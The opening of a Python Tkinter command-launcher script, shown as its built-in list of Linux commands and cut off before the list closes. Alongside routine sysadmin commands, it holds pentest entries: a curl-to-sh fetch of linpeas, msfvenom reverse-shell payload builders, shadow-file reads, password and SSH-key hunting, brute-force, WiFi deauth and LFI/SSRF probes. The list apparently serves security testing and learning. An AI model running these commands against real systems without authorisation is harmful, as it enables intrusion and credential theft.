#!/usr/bin/env python3
"""CommandLine Commander + Command Creator.

Simplified two-tab Linux command GUI:
1. Commander - browse/search/run the large built-in command collection.
2. Command Creator - build, preview, save, and run reusable command templates.

Administrator mode uses pkexec so Linux/PolicyKit displays the normal
graphical authentication prompt instead of trying to read a sudo password
inside Tkinter.
"""
from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
import getpass
import json
import os
import shlex
import shutil
import signal
import subprocess
import threading
import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog, scrolledtext, ttk


@dataclass(frozen=True, slots=True)
class Command:
    category: str
    name: str
    text: str


COMMANDS = (
    Command('System Info', 'OS & Kernel Info', 'uname -a'),
    Command('System Info', 'Distro Info', 'cat /etc/os-release'),
    Command('System Info', 'CPU Info', 'lscpu'),
    Command('System Info', 'CPU Temperature', 'sensors 2>/dev/null || cat /sys/class/thermal/thermal_zone*/temp 2>/dev/null | awk \'{print $1/1000"°C"}\''),
    Command('System Info', 'Memory Info', 'free -h'),
    Command('System Info', 'Memory Detail', 'cat /proc/meminfo | head -30'),
    Command('System Info', 'Disk Usage', 'df -h'),
    Command('System Info', 'Uptime', 'uptime -p'),
    Command('System Info', 'Current User', 'whoami && id'),
    Command('System Info', 'Logged-in Users', 'who -a'),
    Command('System Info', 'Environment Variables', 'printenv'),
    Command('System Info', 'Hostname', 'hostname -f'),
    Command('System Info', 'System Load', 'top -bn1 | head -20'),
    Command('System Info', 'Hardware Summary', 'lshw -short 2>/dev/null || dmidecode -t system 2>/dev/null'),
    Command('System Info', 'PCI Devices', 'lspci'),
    Command('System Info', 'USB Devices', 'lsusb'),
    Command('System Info', 'Block Devices', 'lsblk -a'),
    Command('System Info', 'Mounted Filesystems', 'mount | column -t'),
    Command('System Info', 'Swap Info', 'swapon --show'),
    Command('System Info', 'System Limits', 'ulimit -a'),
    Command('System Info', 'BIOS Info', 'sudo dmidecode -t bios 2>/dev/null | head -20'),
    Command('System Info', 'Memory Slots', "sudo dmidecode -t memory 2>/dev/null | grep -E 'Size|Speed|Type' | head -20"),
    Command('System Info', 'Boot Time', 'who -b'),
    Command('System Info', 'Kernel Parameters', 'sysctl -a 2>/dev/null | head -40'),
    Command('System Info', 'CPU Flags', 'grep flags /proc/cpuinfo | head -1'),
    Command('System Info', 'System Entropy', 'cat /proc/sys/kernel/random/entropy_avail'),
    Command('Network', 'All Interfaces', 'ip a'),
    Command('Network', 'Routing Table', 'ip route'),
    Command('Network', 'ARP Table', 'arp -n'),
    Command('Network', 'Active Connections', 'ss -tunapl'),
    Command('Network', 'Listening Ports', 'ss -tlnp'),
    Command('Network', 'TCP Connection States', 'ss -s'),
    Command('Network', 'DNS Config', 'cat /etc/resolv.conf'),
    Command('Network', 'Hosts File', 'cat /etc/hosts'),
    Command('Network', 'Ping Google', 'ping -c 4 8.8.8.8'),
    Command('Network', 'Traceroute Google', 'traceroute 8.8.8.8 2>/dev/null || tracepath 8.8.8.8'),
    Command('Network', 'Public IP', 'curl -s ifconfig.me && echo'),
    Command('Network', 'GeoIP Lookup', 'curl -s https://ipinfo.io && echo'),
    Command('Network', 'Network Stats', 'netstat -s 2>/dev/null | head -40'),
    Command('Network', 'WiFi Networks', 'nmcli dev wifi list 2>/dev/null || iwlist scan 2>/dev/null | head -50'),
    Command('Network', 'WiFi Status', 'nmcli -t -f ACTIVE,SSID,SIGNAL dev wifi 2>/dev/null'),
    Command('Network', 'Network Interfaces', 'nmcli device status 2>/dev/null'),
    Command('Network', 'Firewall Rules (iptables)', 'iptables -L -n -v 2>/dev/null'),
    Command('Network', 'Firewall (ufw)', 'ufw status verbose 2>/dev/null'),
    Command('Network', 'nftables Rules', 'nft list ruleset 2>/dev/null'),
    Command('Network', 'DNS Lookup', 'nslookup google.com'),
    Command('Network', 'Dig DNS Query', 'dig google.com ANY +short 2>/dev/null'),
    Command('Network', 'WHOIS (google.com)', 'whois google.com 2>/dev/null | head -30'),
    Command('Network', 'HTTP Headers', 'curl -I https://example.com'),
    Command('Network', 'IPv6 Addresses', 'ip -6 addr'),
    Command('Network', 'MAC Addresses', "ip link show | grep 'link/ether'"),
    Command('Network', 'Network Neighbors', 'ip neigh show'),
    Command('Network', 'Bandwidth Stats', 'cat /proc/net/dev | column -t'),
    Command('Processes', 'All Processes', 'ps aux --sort=-%cpu | head -30'),
    Command('Processes', 'Process Tree', 'pstree -p 2>/dev/null || ps auxf | head -40'),
    Command('Processes', 'Top by CPU', 'ps aux --sort=-%cpu | head -20'),
    Command('Processes', 'Top by Memory', 'ps aux --sort=-%mem | head -20'),
    Command('Processes', 'Kill by Name', '# killall PROCESS_NAME'),
    Command('Processes', 'Kill by PID', '# kill -9 PID'),
    Command('Processes', 'Background Jobs', 'jobs -l'),
    Command('Processes', 'Cron Jobs (user)', 'crontab -l 2>/dev/null'),
    Command('Processes', 'System Cron Jobs', 'ls -la /etc/cron* /var/spool/cron/ 2>/dev/null'),
    Command('Processes', 'Running Services', 'systemctl list-units --type=service --state=running'),
    Command('Processes', 'All Services', 'systemctl list-units --type=service'),
    Command('Processes', 'Failed Services', 'systemctl --failed'),
    Command('Processes', 'SSH Service Status', 'systemctl status ssh 2>/dev/null || systemctl status sshd 2>/dev/null'),
    Command('Processes', 'Start Service', '# sudo systemctl start SERVICE_NAME'),
    Command('Processes', 'Stop Service', '# sudo systemctl stop SERVICE_NAME'),
    Command('Processes', 'Restart Service', '# sudo systemctl restart SERVICE_NAME'),
    Command('Processes', 'Enable at Boot', '# sudo systemctl enable SERVICE_NAME'),
    Command('Processes', 'Disable Service', '# sudo systemctl disable SERVICE_NAME'),
    Command('Processes', 'Daemon Reload', '# sudo systemctl daemon-reload'),
    Command('Processes', 'Zombie Processes', 'ps aux | awk \'{if ($8=="Z") print}\' | head -20'),
    Command('Processes', 'Process by Nice', 'ps -eo pid,ni,comm --sort ni | head -20'),
    Command('Processes', 'Open File Descriptors', 'ls /proc/$$/fd | wc -l'),
    Command('File System', 'List Current Dir', 'ls -lahF --color=never'),
    Command('File System', 'Tree View (2 levels)', 'tree -L 2 2>/dev/null || find . -maxdepth 2 | head -60'),
    Command('File System', 'Find Large Files (>100MB)', 'find / -type f -size +100M 2>/dev/null | head -20'),
    Command('File System', 'Find SUID Files', 'find / -perm -4000 -type f 2>/dev/null'),
    Command('File System', 'Find World-Writable', 'find / -perm -0002 -type f 2>/dev/null | head -20'),
    Command('File System', 'Disk Usage by Dir', 'du -sh /* 2>/dev/null | sort -rh | head -20'),
    Command('File System', 'Recently Modified Files', 'find / -mtime -1 -type f 2>/dev/null | grep -v proc | head -30'),
    Command('File System', 'Open Files (lsof)', 'lsof 2>/dev/null | head -40'),
    Command('File System', 'Inode Usage', 'df -i'),
    Command('File System', '/tmp Contents', 'ls -laht /tmp/'),
    Command('File System', 'Hidden Files (home)', 'ls -lah ~/'),
    Command('File System', 'File Permissions Check', 'stat /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null'),
    Command('File System', 'Sticky Bit Files', 'find / -perm -1000 -type d 2>/dev/null | head -20'),
    Command('File System', 'Find Config Files', "find /etc /opt /var/www -name '*.conf' 2>/dev/null | head -20"),
    Command('File System', 'Find Backup Files', "find / -name '*.bak' -o -name '*.old' 2>/dev/null | head -20"),
    Command('File System', 'Largest Directories', 'du -sh /home/* /var/* 2>/dev/null | sort -rh | head -15'),
    Command('File System', 'Find Orphaned Files', 'find / -nouser -o -nogroup 2>/dev/null | head -20'),
    Command('File System', 'SMART Disk Status', 'sudo smartctl -a /dev/sda 2>/dev/null | head -30'),
    Command('Users & Perms', 'All Users', 'cat /etc/passwd | column -t -s:'),
    Command('Users & Perms', 'All Groups', 'cat /etc/group | column -t -s:'),
    Command('Users & Perms', 'Current User Detail', 'id && groups'),
    Command('Users & Perms', 'Sudo Users', "cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'"),
    Command('Users & Perms', 'Sudo Group Members', 'getent group sudo 2>/dev/null'),
    Command('Users & Perms', 'Last Logins', 'last | head -20'),
    Command('Users & Perms', 'Failed Login Attempts', "lastb 2>/dev/null | head -20 || grep 'Failed' /var/log/auth.log 2>/dev/null | tail -20"),
    Command('Users & Perms', 'Shadow File (root only)', 'sudo cat /etc/shadow 2>/dev/null | head -20'),
    Command('Users & Perms', 'Add User', '# sudo useradd -m -s /bin/bash USERNAME'),
    Command('Users & Perms', 'Delete User', '# sudo userdel -r USERNAME'),
    Command('Users & Perms', 'Change Password', '# sudo passwd USERNAME'),
    Command('Users & Perms', 'Add to sudo', '# sudo usermod -aG sudo USERNAME'),
    Command('Users & Perms', 'Lock User', '# sudo usermod -L USERNAME'),
    Command('Users & Perms', 'Unlock User', '# sudo usermod -U USERNAME'),
    Command('Users & Perms', 'SSH Authorized Keys', 'cat ~/.ssh/authorized_keys 2>/dev/null'),
    Command('Users & Perms', 'Passwd Policy', 'chage -l root 2>/dev/null'),
    Command('Users & Perms', 'Active Sessions (w)', 'w'),
    Command('Users & Perms', 'Login Shells', 'cat /etc/shells'),
    Command('Users & Perms', 'Account Expiry', 'chage -l $USER 2>/dev/null'),
    Command('Users & Perms', 'PAM Modules', 'ls /etc/pam.d/ 2>/dev/null'),
    Command('Packages', 'Update Package List', 'sudo apt update 2>/dev/null || sudo yum check-update 2>/dev/null || sudo pacman -Sy 2>/dev/null'),
    Command('Packages', 'Upgrade All', 'sudo apt upgrade -y 2>/dev/null || sudo yum update -y 2>/dev/null'),
    Command('Packages', 'Install Package', '# sudo apt install PACKAGE_NAME'),
    Command('Packages', 'Remove Package', '# sudo apt remove PACKAGE_NAME'),
    Command('Packages', 'Purge Package', '# sudo apt purge PACKAGE_NAME'),
    Command('Packages', 'Search Package', '# apt search QUERY'),
    Command('Packages', 'List Installed', 'dpkg -l 2>/dev/null | head -40 || rpm -qa 2>/dev/null | head -40 || pacman -Q 2>/dev/null | head -40'),
    Command('Packages', 'Show Package Info', '# apt show PACKAGE_NAME'),
    Command('Packages', 'List Upgradable', 'apt list --upgradable 2>/dev/null | head -20'),
    Command('Packages', 'Auto Remove', 'sudo apt autoremove -y 2>/dev/null'),
    Command('Packages', 'Clean Cache', 'sudo apt clean 2>/dev/null'),
    Command('Packages', 'Fix Broken', 'sudo apt --fix-broken install 2>/dev/null'),
    Command('Packages', 'Snap Packages', 'snap list 2>/dev/null'),
    Command('Packages', 'Flatpak Packages', 'flatpak list 2>/dev/null'),
    Command('Packages', 'pip Packages', 'pip3 list 2>/dev/null | head -30'),
    Command('Packages', 'pip Outdated', 'pip3 list --outdated 2>/dev/null | head -20'),
    Command('Packages', 'npm Global', 'npm list -g --depth=0 2>/dev/null'),
    Command('Packages', 'gem List (Ruby)', 'gem list 2>/dev/null | head -20'),
    Command('Packages', 'cargo List (Rust)', 'cargo install --list 2>/dev/null'),
    Command('Security', 'Open Ports (all)', 'ss -tunapl'),
    Command('Security', 'Listening Services', 'netstat -tlnp 2>/dev/null || ss -tlnp'),
    Command('Security', 'Firewall Status', 'ufw status verbose 2>/dev/null; iptables -L -n 2>/dev/null | head -30'),
    Command('Security', 'SELinux Status', 'getenforce 2>/dev/null; sestatus 2>/dev/null'),
    Command('Security', 'AppArmor Status', 'apparmor_status 2>/dev/null || aa-status 2>/dev/null'),
    Command('Security', 'AutLogss', 'sudo tail -50 /var/log/auth.log 2>/dev/null || sudo tail -50 /var/log/secure 2>/dev/null'),
    Command('Security', 'Syslog Tail', 'sudo tail -50 /var/log/syslog 2>/dev/null'),
    Command('Security', 'SUID Binaries', 'find / -perm -4000 2>/dev/null | xargs ls -la 2>/dev/null'),
    Command('Security', 'Writable /etc files', 'find /etc -writable 2>/dev/null | head -20'),
    Command('Security', 'Check Rootkits', 'sudo chkrootkit 2>/dev/null | grep INFECTED'),
    Command('Security', 'Rkhunter Check', 'sudo rkhunter --check --skip-keypress 2>/dev/null | tail -30'),
    Command('Security', 'Lynis Audit', 'sudo lynis audit system --quick 2>/dev/null | tail -30'),
    Command('Security', 'GPG Keys', 'gpg --list-keys 2>/dev/null'),
    Command('Security', 'SSL Certs Check', 'openssl x509 -in /etc/ssl/certs/ca-certificates.crt -text -noout 2>/dev/null | head -20'),
    Command('Security', 'Failed SSH Attempts', "sudo grep 'sshd.*Failed' /var/log/auth.log 2>/dev/null | tail -20"),
    Command('Security', 'PAM Config', 'cat /etc/pam.d/common-auth 2>/dev/null'),
    Command('Security', 'Capabilities Check', 'getcap -r / 2>/dev/null | head -20'),
    Command('Security', 'Audit Rules', 'sudo auditctl -l 2>/dev/null | head -20'),
    Command('Security', 'Sudoers Check', 'sudo -l 2>/dev/null'),
    Command('Security', 'Kernel Security', 'sysctl kernel.randomize_va_space kernel.dmesg_restrict 2>/dev/null'),
    Command('PrivEsc', 'Sudo Permissions', 'sudo -l 2>/dev/null'),
    Command('PrivEsc', 'SUID Binaries', 'find / -perm -4000 -type f 2>/dev/null | xargs ls -la 2>/dev/null'),
    Command('PrivEsc', 'SGID Binaries', 'find / -perm -2000 -type f 2>/dev/null | xargs ls -la 2>/dev/null'),
    Command('PrivEsc', 'World-Writable Dirs', 'find / -perm -0002 -type d 2>/dev/null | head -20'),
    Command('PrivEsc', 'All Cron Jobs', 'cat /etc/crontab; ls -la /etc/cron*; cat /var/spool/cron/crontabs/* 2>/dev/null'),
    Command('PrivEsc', 'Writable Cron Scripts', 'find /etc/cron* -writable 2>/dev/null'),
    Command('PrivEsc', 'PATH Variable', 'echo $PATH'),
    Command('PrivEsc', 'Capabilities', 'getcap -r / 2>/dev/null'),
    Command('PrivEsc', 'Docker Group Check', 'id | grep docker && ls -la /var/run/docker.sock 2>/dev/null'),
    Command('PrivEsc', 'LXD Group Check', 'id | grep lxd 2>/dev/null'),
    Command('PrivEsc', 'NFS Shares', 'cat /etc/exports 2>/dev/null; showmount -e localhost 2>/dev/null'),
    Command('PrivEsc', 'Writable /etc/passwd', 'ls -la /etc/passwd; stat /etc/passwd'),
    Command('PrivEsc', 'PATH Writable Scripts', "for d in $(echo $PATH | tr ':' ' '); do find $d -writable 2>/dev/null; done"),
    Command('PrivEsc', 'Passwords in Files', "grep -r 'password\\|passwd\\|secret\\|token' /home/ /var/www/ /opt/ 2>/dev/null | grep -v Binary | head -20"),
    Command('PrivEsc', 'SSH Keys Hunt', "find / -name 'id_rsa' -o -name 'id_dsa' 2>/dev/null"),
    Command('PrivEsc', '.bashrc / .profile', 'cat ~/.bashrc ~/.bash_profile ~/.profile 2>/dev/null'),
    Command('PrivEsc', 'Root Services', 'ps aux | grep root | grep -v \\['),
    Command('PrivEsc', 'Installed Compilers', 'which gcc g++ python3 perl ruby 2>/dev/null'),
    Command('PrivEsc', 'LinPEAS (run)', '# curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'),
    Command('PrivEsc', 'LinEnum Script', '# bash linenum.sh 2>/dev/null'),
    Command('PrivEsc', 'GTFOBins Check', 'sudo -l 2>/dev/null && find / -perm -4000 2>/dev/null | head -20'),
    Command('PrivEsc', 'Kernel Version (exploits)', 'uname -r'),
    Command('PrivEsc', 'Polkit Check', 'dpkg -l policykit-1 2>/dev/null || rpm -qa polkit 2>/dev/null'),
    Command('Metasploit', 'Start MSF Console', 'msfconsole'),
    Command('Metasploit', 'Start MSF (quiet)', 'msfconsole -q'),
    Command('Metasploit', 'Update Metasploit', 'sudo apt update && sudo apt install metasploit-framework -y 2>/dev/null'),
    Command('Metasploit', 'MSF Version', 'msfconsole -v 2>/dev/null'),
    Command('Metasploit', 'Start PostgreSQL', 'sudo service postgresql start && msfdb init 2>/dev/null'),
    Command('Metasploit', 'MSF DB Status', 'msfdb status 2>/dev/null'),
    Command('Metasploit', 'Search EternalBlue', "msfconsole -q -x 'search ms17_010; exit'"),
    Command('Metasploit', 'EternalBlue Setup', "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; show options; exit'"),
    Command('Metasploit', 'Meterpreter Payload', "msfconsole -q -x 'use payload/windows/x64/meterpreter/reverse_tcp; show options; exit'"),
    Command('Metasploit', 'List Payloads', "msfconsole -q -x 'show payloads; exit' 2>/dev/null | head -40"),
    Command('Metasploit', 'msfvenom Formats', 'msfvenom -l formats 2>/dev/null | head -30'),
    Command('Metasploit', 'msfvenom Win EXE', '# msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > shell.exe'),
    Command('Metasploit', 'msfvenom Linux ELF', '# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf > shell.elf'),
    Command('Metasploit', 'msfvenom Android APK', '# msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 R > app.apk'),
    Command('Metasploit', 'msfvenom PHP Payload', '# msfvenom -p php/meterpreter_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw > shell.php'),
    Command('Metasploit', 'msfvenom Python Payload', '# msfvenom -p python/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw > shell.py'),
    Command('Metasploit', 'msfvenom WAR Payload', '# msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f war > shell.war'),
    Command('Metasploit', 'Multi Handler', "msfconsole -q -x 'use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; show options; exit'"),
    Command('Metasploit', 'Scan SMB', "# msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS TARGET; run; exit'"),
    Command('Metasploit', 'Port Scanner', "# msfconsole -q -x 'use auxiliary/scanner/portscan/tcp; set RHOSTS TARGET; run; exit'"),
    Command('Metasploit', 'SSH Brute Force', "# msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS TARGET; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; run; exit'"),
    Command('Metasploit', 'FTP Brute Force', "# msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_login; set RHOSTS TARGET; set USER_FILE /path/users.txt; set PASS_FILE /path/pass.txt; run; exit'"),
    Command('Metasploit', 'HTTP Dir Scanner', "# msfconsole -q -x 'use auxiliary/scanner/http/dir_scanner; set RHOSTS TARGET; run; exit'"),
    Command('Nmap & Recon', 'Nmap Version', 'nmap --version'),
    Command('Nmap & Recon', 'Quick Scan', '# nmap -T4 TARGET'),
    Command('Nmap & Recon', 'Full Port Scan', '# nmap -p- -T4 TARGET'),
    Command('Nmap & Recon', 'Service & Version Scan', '# nmap -sV -sC -T4 TARGET'),
    Command('Nmap & Recon', 'OS Detection', '# sudo nmap -O TARGET'),
    Command('Nmap & Recon', 'Aggressive Scan', '# sudo nmap -A -T4 TARGET'),
    Command('Nmap & Recon', 'UDP Scan', '# sudo nmap -sU --top-ports 100 TARGET'),
    Command('Nmap & Recon', 'Stealth SYN Scan', '# sudo nmap -sS -T4 TARGET'),
    Command('Nmap & Recon', 'Vulnerability Scan', '# nmap --script vuln TARGET'),
    Command('Nmap & Recon', 'SMB Vuln Check', '# nmap --script smb-vuln* TARGET'),
    Command('Nmap & Recon', 'Heartbleed Check', '# nmap --script ssl-heartbleed TARGET'),
    Command('Nmap & Recon', 'Scan Network Range', '# nmap -sn 192.168.1.0/24'),
    Command('Nmap & Recon', 'DNS Brute Force', '# nmap --script dns-brute TARGET'),
    Command('Nmap & Recon', 'HTTP Enum', '# nmap --script http-enum TARGET'),
    Command('Nmap & Recon', 'Nmap Output to File', '# nmap -oA scan_results TARGET'),
    Command('Nmap & Recon', 'Masscan (fast)', '# sudo masscan -p0-65535 TARGET --rate=1000'),
    Command('Nmap & Recon', 'Nikto Web Scan', '# nikto -h http://TARGET'),
    Command('Nmap & Recon', 'Gobuster Dir', '# gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt'),
    Command('Nmap & Recon', 'Gobuster Vhost', '# gobuster vhost -u http://TARGET -w /usr/share/wordlists/subdomains.txt'),
    Command('Nmap & Recon', 'FFUF Fuzz', '# ffuf -w wordlist.txt -u http://TARGET/FUZZ'),
    Command('Nmap & Recon', 'Dirb Scan', '# dirb http://TARGET'),
    Command('Nmap & Recon', 'WhatWeb Fingerprint', '# whatweb TARGET'),
    Command('Nmap & Recon', 'theHarvester', '# theHarvester -d TARGET -b all 2>/dev/null'),
    Command('Nmap & Recon', 'Subfinder', '# subfinder -d TARGET 2>/dev/null'),
    Command('Nmap & Recon', 'DNSrecon', '# dnsrecon -d TARGET -t std 2>/dev/null'),
    Command('Nmap & Recon', 'Enum4linux', '# enum4linux -a TARGET'),
    Command('Password Tools', 'John — Help', 'john --help 2>/dev/null | head -30'),
    Command('Password Tools', 'John — Crack Shadow', '# sudo john /etc/shadow'),
    Command('Password Tools', 'John — Wordlist Attack', '# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt'),
    Command('Password Tools', 'John — Show Cracked', '# john --show hash.txt'),
    Command('Password Tools', 'John — List Formats', 'john --list=formats 2>/dev/null | head -20'),
    Command('Password Tools', 'John — Incremental', '# john --incremental hash.txt'),
    Command('Password Tools', 'Hashcat — Help', 'hashcat --help 2>/dev/null | head -30'),
    Command('Password Tools', 'Hashcat — MD5', '# hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt'),
    Command('Password Tools', 'Hashcat — SHA1', '# hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt'),
    Command('Password Tools', 'Hashcat — SHA256', '# hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt'),
    Command('Password Tools', 'Hashcat — NTLM', '# hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt'),
    Command('Password Tools', 'Hashcat — WPA2', '# hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt'),
    Command('Password Tools', 'Hashcat — bcrypt', '# hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt'),
    Command('Password Tools', 'Hydra — SSH', '# hydra -l user -P /usr/share/wordlists/rockyou.txt TARGET ssh'),
    Command('Password Tools', 'Hydra — FTP', '# hydra -l user -P /usr/share/wordlists/rockyou.txt TARGET ftp'),
    Command('Password Tools', 'Hydra — HTTP POST', "# hydra -l user -P wordlist.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"),
    Command('Password Tools', 'Medusa', '# medusa -h TARGET -u user -P wordlist.txt -M ssh'),
    Command('Password Tools', 'Wordlists Location', 'ls /usr/share/wordlists/ 2>/dev/null'),
    Command('Password Tools', 'crunch Wordlist', '# crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt'),
    Command('Password Tools', 'CeWL Wordlist', '# cewl http://TARGET -d 2 -m 5 -w wordlist.txt'),
    Command('Password Tools', 'Identify Hash', '# hash-identifier HASH_VALUE'),
    Command('Wireless', 'Wireless Interfaces', 'iwconfig 2>/dev/null || iw dev'),
    Command('Wireless', 'Scan WiFi', "sudo iwlist wlan0 scan 2>/dev/null | grep -E 'ESSID|Signal|Frequency'"),
    Command('Wireless', 'Monitor Mode ON', '# sudo airmon-ng start wlan0'),
    Command('Wireless', 'Monitor Mode OFF', '# sudo airmon-ng stop wlan0mon'),
    Command('Wireless', 'Check Monitor Mode', 'iwconfig 2>/dev/null | grep Monitor'),
    Command('Wireless', 'Airodump-ng Scan', '# sudo airodump-ng wlan0mon'),
    Command('Wireless', 'Capture WPA Handshake', '# sudo airodump-ng -c CHANNEL --bssid TARGET_BSSID -w capture wlan0mon'),
    Command('Wireless', 'Deauth Attack', '# sudo aireplay-ng -0 5 -a TARGET_BSSID wlan0mon'),
    Command('Wireless', 'WPA2 Crack (aircrack)', '# aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt'),
    Command('Wireless', 'Bluetooth Scan', 'hcitool scan 2>/dev/null'),
    Command('Wireless', 'Bluetooth Devices', 'bluetoothctl devices 2>/dev/null'),
    Command('Wireless', 'Bluetooth Info', 'hciconfig -a 2>/dev/null'),
    Command('Wireless', 'PMKID Attack', '# hcxdumptool -i wlan0mon -o capture.pcapng'),
    Command('Wireless', 'Bettercap WiFi', '# sudo bettercap -iface wlan0mon'),
    Command('Wireless', 'Kismet Start', '# sudo kismet'),
    Command('Wireless', 'WiFite Auto Attack', '# sudo wifite'),
    Command('Web Exploit', 'SQLMap — Basic', "# sqlmap -u 'http://TARGET/page?id=1'"),
    Command('Web Exploit', 'SQLMap — POST', "# sqlmap -u 'http://TARGET/login' --data='user=admin&pass=test'"),
    Command('Web Exploit', 'SQLMap — Dump DBs', "# sqlmap -u 'http://TARGET/page?id=1' --dbs"),
    Command('Web Exploit', 'SQLMap — Get Tables', "# sqlmap -u 'http://TARGET/page?id=1' -D dbname --tables"),
    Command('Web Exploit', 'SQLMap — Dump Table', "# sqlmap -u 'http://TARGET/page?id=1' -D dbname -T tablename --dump"),
    Command('Web Exploit', 'SQLMap — Risk/Level', "# sqlmap -u 'http://TARGET/page?id=1' --risk=3 --level=5"),
    Command('Web Exploit', 'XSStrike', "# python3 xsstrike.py -u 'http://TARGET/page?q=test'"),
    Command('Web Exploit', 'Burp Suite', '# burpsuite &'),
    Command('Web Exploit', 'OWASP ZAP', '# zaproxy &'),
    Command('Web Exploit', 'wfuzz', '# wfuzz -c -z file,wordlist.txt http://TARGET/FUZZ'),
    Command('Web Exploit', 'FFUF Fuzz', '# ffuf -w wordlist.txt -u http://TARGET/FUZZ'),
    Command('Web Exploit', 'FFUF Header Fuzz', "# ffuf -w wordlist.txt -u http://TARGET -H 'Host: FUZZ.TARGET'"),
    Command('Web Exploit', 'Wafw00f WAF', '# wafw00f http://TARGET'),
    Command('Web Exploit', 'Commix CMDi', "# commix --url='http://TARGET/page?cmd=test'"),
    Command('Web Exploit', 'BeEF XSS', '# sudo beef-xss'),
    Command('Web Exploit', 'LFI Test', "# curl 'http://TARGET/page?file=../../../../etc/passwd'"),
    Command('Web Exploit', 'SSRF Test', "# curl 'http://TARGET/fetch?url=http://127.0.0.1:22'"),
    Command('Web Exploit', 'CORS Check', "# curl -I -H 'Origin: http://evil.com' http://TARGET/api/"),
    Command('Web Exploit', 'JWT Decode', '# python3 -c "import base64,json; t=\'JWT\'; print(json.loads(base64.b64decode(t.split(\'.\')[1]+\'==\').decode()))"'),
    Command('Web Exploit', 'Shodan CLI', "# shodan search 'apache port:80 country:LK'"),
    Command('Forensics', 'Volatility — Image Info', '# volatility -f memory.raw imageinfo'),
    Command('Forensics', 'Volatility — Process List', '# volatility -f memory.raw --profile=PROFILE pslist'),
    Command('Forensics', 'Volatility — Network', '# volatility -f memory.raw --profile=PROFILE connections'),
    Command('Forensics', 'Volatility3 — WinInfo', '# python3 vol.py -f memory.raw windows.info'),
    Command('Forensics', 'Strings from Binary', '# strings suspicious_file'),
    Command('Forensics', 'Strings (Unicode)', '# strings -el suspicious_file'),
    Command('Forensics', 'Hex Dump', '# xxd suspicious_file | head -30'),
    Command('Forensics', 'File Type Check', '# file suspicious_file'),
    Command('Forensics', 'Binwalk Analysis', '# binwalk suspicious_file'),
    Command('Forensics', 'Binwalk Extract', '# binwalk -e suspicious_file'),
    Command('Forensics', 'Steghide Check', '# steghide info image.jpg'),
    Command('Forensics', 'Steghide Extract', '# steghide extract -sf image.jpg'),
    Command('Forensics', 'Exiftool Metadata', '# exiftool file'),
    Command('Forensics', 'Foremost Carving', '# foremost -i disk.img -o output/'),
    Command('Forensics', 'Scalpel Carving', '# scalpel disk.img -o output/'),
    Command('Forensics', 'Wireshark', 'wireshark &'),
    Command('Forensics', 'Tcpdump Capture', '# sudo tcpdump -i eth0 -w capture.pcap'),
    Command('Forensics', 'Tcpdump Read', '# tcpdump -r capture.pcap'),
    Command('Forensics', 'Tshark HTTP GET', "# tshark -r capture.pcap -Y 'http.request.method==GET'"),
    Command('Forensics', 'Live Traffic', 'sudo tcpdump -i any -nn -v 2>/dev/null | head -30'),
    Command('Forensics', 'Autopsy', '# autopsy &'),
    Command('Forensics', 'dd Disk Image', '# sudo dd if=/dev/sdX of=disk.img bs=4M status=progress'),
    Command('Forensics', 'md5sum', '# md5sum file'),
    Command('Forensics', 'sha256sum', '# sha256sum file'),
    Command('Forensics', 'Timeline MAC', "# find / -printf '%T+ %p\n' 2>/dev/null | sort | tail -50"),
    Command('Reverse Eng', 'File Type', '# file binary'),
    Command('Reverse Eng', 'ELF Headers', '# readelf -h binary'),
    Command('Reverse Eng', 'ELF Symbols', '# readelf -s binary'),
    Command('Reverse Eng', 'ELF Sections', '# readelf -S binary'),
    Command('Reverse Eng', 'Disassemble (objdump)', '# objdump -d binary | head -60'),
    Command('Reverse Eng', 'Strings — Keywords', "# strings binary | grep -E '(http|pass|key|secret|flag)'"),
    Command('Reverse Eng', 'ltrace', '# ltrace ./binary'),
    Command('Reverse Eng', 'strace', '# strace ./binary'),
    Command('Reverse Eng', 'GDB', '# gdb ./binary'),
    Command('Reverse Eng', 'GDB with PEDA', "# gdb -q -ex 'source ~/.gdbinit' ./binary"),
    Command('Reverse Eng', 'Ghidra', '# ghidraRun &'),
    Command('Reverse Eng', 'Radare2 Analysis', '# r2 -A binary'),
    Command('Reverse Eng', 'Radare2 — Print Main', "# r2 -A binary -q -c 'pdf @main'"),
    Command('Reverse Eng', 'Checksec', '# checksec --file=binary 2>/dev/null || pwn checksec binary 2>/dev/null'),
    Command('Reverse Eng', 'ROPgadget', '# ROPgadget --binary binary 2>/dev/null | head -30'),
    Command('Reverse Eng', 'pwntools Template', '# python3 -c "from pwn import *; r = process(\'./binary\'); r.interactive()"'),
    Command('Reverse Eng', 'Detect Packing', "# upx -d binary 2>/dev/null || echo 'Try manual analysis'"),
    Command('Reverse Eng', 'Dynamic Libs', '# ldd binary'),
    Command('Reverse Eng', 'Anti-Debug Check', "# strings binary | grep -E '(ptrace|IsDebuggerPresent)'"),
